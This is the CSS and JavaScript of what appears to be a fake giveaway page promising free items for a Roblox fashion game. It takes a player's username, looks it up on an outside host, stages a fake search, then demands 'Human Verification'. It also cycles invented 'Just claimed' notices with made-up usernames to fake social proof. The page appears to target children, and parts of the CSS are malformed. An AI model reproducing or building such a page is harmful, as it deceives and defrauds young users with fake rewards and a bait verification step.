        @font-face {
            font-family: 'Refinery 95';

        }
        body {background-image: radial-gradient(circle, rgba(204,25,31,1) 0%, rgb(115, 1, 7) 100%);background-repeat: no-repeat;background-size: cover;background-position: center;background-attachment: fixed; font-family: 'Refinery 95';color: #fff;font-weight: bold;}
        .top-img {position: fixed;top: 0;left: 0;right: 0;width: 100%;z-index: 88;}
        .bottom-img {position: fixed;bottom: 0;left: 0;right: 0;width: 100%;z-index: 88;}
        #particles-js {
            position: fixed;
            width: 100%;
            height: 100%;
            z-index: -888;
        }
        .logo {display: flex;justify-content: center;align-items: center;margin-top: 80px;}
        .logo img {width: 290px;margin: 25px auto;}
        .container-md {padding: 0 50px;}
        .item {position: relative;margin: 10px 0;text-align: center;cursor:pointer;}
        .item.active img {box-shadow: 0px 0px 20px 4px rgb(215, 179, 2);}
        .item .cap {position: absolute;left: 50%;transform: translate(-50%);display: none;}
        .item img {width: 100%;border-radius: 50%;}
        .item .title {margin-top: 9px;margin-bottom: 10px; text-shadow: 2px 2px 9px #c8be00;}
        .folding {
            margin: 20px auto;
            width: 70px;
            height: 70px;
            position: relative;
            transform: rotateZ(45deg);
        }
        .square {
            position: absolute;
            top: 30%;
            right: 30%;
            width: 30px;
            height: 30px;
            background-color: crimson;
            transform: rotateZ(87deg);
        }
        .folding .sk-cube {
            float: left;
            width: 50%;
            height: 50%;
            position: relative;
            transform: scale(1.1);
        }
        .folding .sk-cube:before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
            animation: sk-foldCubeAngle 2.4s infinite linear both;
            transform-origin: 100% 100%;
        }
        .folding .sk-cube2 {
            transform: scale(1.1) rotateZ(90deg);
        }
        .folding .sk-cube3 {
            transform: scale(1.1) rotateZ(180deg);
        }
        .folding .sk-cube4 {
            transform: scale(1.1) rotateZ(270deg);
        }
        .folding .sk-cube2:before {
            animation-delay: 0.3s;
        }
        .folding .sk-cube3:before {
            animation-delay: 0.6s;
        }
        .folding .sk-cube4:before {
            animation-delay: 0.9s;
        }
        @keyframes sk-foldCubeAngle {
            0%, 10% {transform: perspective(140px) rotateX(-180deg);opacity: 0;}
            25%, 75% {transform: perspective(140px) rotateX(0deg);opacity: 1;}
            90%, 100% {transform: perspective(140px) rotateY(180deg);opacity: 0;}
        }
        .mode {background-color: rgba(0,0,0,.7);position: fixed;top: 0;left: 0;right: 0;bottom: 0;z-index: 8888;display: flex;justify-content: center;padding: 60px 20px;overflow: scroll;}

        .mode-1 .cap {position: absolute;width: 80px;right: -20px;top: -56px;transform: rotate(13deg);}
        .mode-1 .can {width: 30px;position: absolute;}

        .message .img img {width: 50px; background: #fff;border-radius: 50%;height: 50px;}
        .message .img {padding-right: 10px;}

            .pc-img-1 {position: fixed;left: 0px;top: 0px;width: 300px;}
            .pc-img-2 {position: fixed;top: 0;right: 0;width: 300px;}
        }
    </style>

    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <script>
        particlesJS("particles-js", {
          particles: {
            number: { value: 150, density: { enable: true, value_area: 800 } },
            color: { value: "#ffffff" },
            shape: { type: "circle" },
            opacity: { value: 0.8, random: true },
            size: { value: 5, random: true },
            line_linked: { enable: false },
            move: {
              enable: true,
              speed: 2,
              direction: "bottom",
              random: false,
              straight: false,
              out_mode: "out"
            }
          },
          interactivity: {
            detect_on: "canvas",
            events: {
              onhover: { enable: false },
              onclick: { enable: false }
            }
          },
          retina_detect: true
        });

        var audio = $("#audio").get(0);

        // Corrected item click handler
        $(".item").on("click", function(){
            audio.play();
            $(".item").removeClass("active");
            $(this).addClass("active");
            $("#steps").removeClass("d-none");
            $(".step").addClass("d-none");
            $("#step-1").removeClass("d-none");
            $("span.item-text").text($(this).find(".title").text());
        });

        $(".heart").on("click", function(){
            audio.play();
            $("#steps").addClass("d-none");
            $(".step").addClass("d-none");
            $("#step-1").removeClass("d-none");
            $("#username").val("");
        });

        $(".continue").on("click", function(){
            audio.play();
            $("#step-3").addClass("d-none");
            $("#step-4").removeClass("d-none");
            $(".heart").addClass("d-none");
            setTimeout(function(){
                $(".searching").text("Human Verification needed to carry on...");
                $(".img-robot").removeClass("d-none");
                $(".loading").addClass("d-none");
                $(".action").removeClass("d-none")
            }, 3000);
        });

        $(".user-search").on("click", function(){
            audio.play();
            var username = $("#username").val();
            $("span.username").text(username);
            $("#step-1").addClass("d-none");
            $("#step-2").removeClass("d-none");
            $(".user-error").addClass("d-none");

            $.ajax({
                url: `https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`,
                type: "GET",
                success: function(profileData) {
                    var res = profileData;
                    if(res["status"] == "SUCCESS"){
                        user_data = res; 
                        $("#step-2").addClass("d-none");
                        $("#step-3").removeClass("d-none");
                        $(".avatar").attr("src", user_data["avatar"]);
                    }else if(res["status"] == "ERROR_USER"){
                        $(".user-error").removeClass("d-none");
                        $("#step-1").removeClass("d-none");
                        $("#step-2").addClass("d-none");
                    }
                },
                error: function() {
                    console.log("Failed to fetch profile information.");
                }
            });

        });

        // ... rest unchanged ...

        const avatars = ['https://dress2.pages.dev/avatars/avatar1.png', 'https://dress2.pages.dev/avatars/avatar2.png', 'https://dress2.pages.dev/avatars/avatar3.png',

                     'https://dress2.pages.dev/avatars/avatar10.png'];

        const items = ['VIP Access', 'Custom Makeup', 'Fast Walk', 'Top Model Rank', 'Runway Diva Rank',
                    '35,000 Tokens', 'Luxury Dress', 'Moongazer Girl Set', 'Futuristic Suit', 'Denim Bag'];

        const usernames = [
            'StarGirl25', 'QueenBee07', 'PrincessLily22', 'GamerGirl101', 'SweetPea13',
            'LunaLove08', 'DivaStar99', 'GlitterQueen55', 'SunshineGal12', 'BellaDream18',
            'Moonlight21', 'Fashionista99', 'SparkleStar08', 'RosyGamer33', 'StarlightGirl88',
            'CandyQueen47', 'LilMiss24', 'DaisyGirl92', 'PinkPrincess23', 'ChicGirl19',
            'DreamyBella17', 'CutiePie06', 'HappyStar28', 'GlitterGirl77', 'CoolGirl31'
        ];

        function showAndHide() {
            setTimeout(function() {
                $(".cliameds").fadeIn(); 
                var html = `
                <div class="message animate_animated animate_bounceInLeft">
                        <img class="border-img" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXJ7XHy-yIbt8eS8WNe8NScejWkLA3j-3Pztrn1BEOQPZNexvSv1vgBfqW-g7ssPVSKeppDSIQhrQuIoIv6Kzq1vIInol_96W3BFHSmRNzJ2gJCLP-W0RQXSruj50mgLZl_he4Mz9dltgSliZ5qZBvUHcA4OTZ3OjQ4BdjtnipwycPh9ZqAnEWr81QFiPU/w160-h200/toppng.com-christmas-border-800x1000.png" alt="">
                        <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
                        <div class="more">
                            <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
                            <div>Just claimed '${items[Math.floor(Math.random() * items.length)]}'</div>
                        </div>
                    </div>
                `;
                $(".cliameds").html(html);

                setTimeout(function() {
                    $(".cliameds").fadeOut(showAndHide);  
                }, 4000);
            }, 3000);
        }

        showAndHide(); 

    </script>
